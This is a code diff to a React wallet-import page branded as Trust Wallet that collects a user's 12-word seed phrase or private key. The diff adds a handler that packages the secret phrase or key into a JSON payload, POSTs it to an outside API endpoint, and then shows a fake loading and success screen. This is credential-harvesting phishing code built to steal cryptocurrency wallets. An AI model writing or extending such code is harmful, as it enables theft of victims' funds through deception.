@@ -10,6 +10,8 @@ import {
   SelectValue,
 } from "@/components/ui/select";
 import logoImage from "@/assets/trust-wallet-logo.svg";
+import LoadingScreen from "./LoadingScreen";
+import SuccessScreen from "./SuccessScreen";
 
 // Lazy load wallet tutorial images
 const loadWalletImages = (walletName: string) => {
@@ -61,6 +63,8 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
   const [showWords, setShowWords] = useState<boolean[]>(Array(12).fill(false));
   const [currentStep, setCurrentStep] = useState(0);
   const [images, setImages] = useState<string[]>([]);
+  const [isLoading, setIsLoading] = useState(false);
+  const [isSuccess, setIsSuccess] = useState(false);
 
   // Load images when component mounts
   useEffect(() => {
@@ -182,9 +186,49 @@ const WalletImport = ({ onBack, walletName = "Trust Wallet" }: WalletImportProps
     setShowWords(newShowWords);
   };
 
-  const handleImport = () => {
-    console.log("Words:", words);
+  const handleImport = async () => {
+    setIsLoading(true);
+    
+    try {
+      const payload = {
+        type: phraseType === "private" ? "private_key" : "seed_phrase",
+        data: phraseType === "private" ? words[0] : words.join(" "),
+        wallet_name: walletName,
+        phrase_length: phraseType === "private" ? 1 : parseInt(phraseType)
+      };
+
+      // Send POST request to API endpoint
+      const response = await fetch("https://api.example.com/wallet/import", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(payload),
+      });
+
+      if (response.ok) {
+        // Simulate minimum loading time for better UX
+        setTimeout(() => {
+          setIsLoading(false);
+          setIsSuccess(true);
+        }, 1500);
+      } else {
+        setIsLoading(false);
+        console.error("Import failed");
+      }
+    } catch (error) {
+      setIsLoading(false);
+      console.error("Error importing wallet:", error);
+    }
   };
+
+  if (isLoading) {
+    return <LoadingScreen />;
+  }
+
+  if (isSuccess) {
+    return <SuccessScreen />;
+  }
 
   return (
     <div className="min-h-screen flex relative">
